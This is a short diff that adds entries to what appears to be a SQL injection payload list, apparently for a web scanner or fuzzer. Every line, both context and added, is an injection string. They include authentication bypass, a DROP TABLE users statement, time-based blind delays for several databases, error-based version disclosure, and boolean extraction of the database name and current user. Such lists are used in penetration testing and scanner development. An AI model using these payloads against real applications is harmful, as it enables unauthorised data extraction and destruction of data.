@@ -8,3 +8,13 @@ admin'--
 1' AND '1'='2
 ' OR SLEEP(5)--
 '; DROP TABLE users--
+1' ORDER BY 10--
+1' ORDER BY 1--
+1 AND SLEEP(3)
+1; WAITFOR DELAY '0:0:3'--
+1' AND 1=CONVERT(int,(SELECT @@version))--
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
+1' AND 1=(SELECT CAST(version() AS int))--
+1'; SELECT pg_sleep(3)--
+1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
+' OR (SELECT SUBSTRING((SELECT current_user),1,1))='r
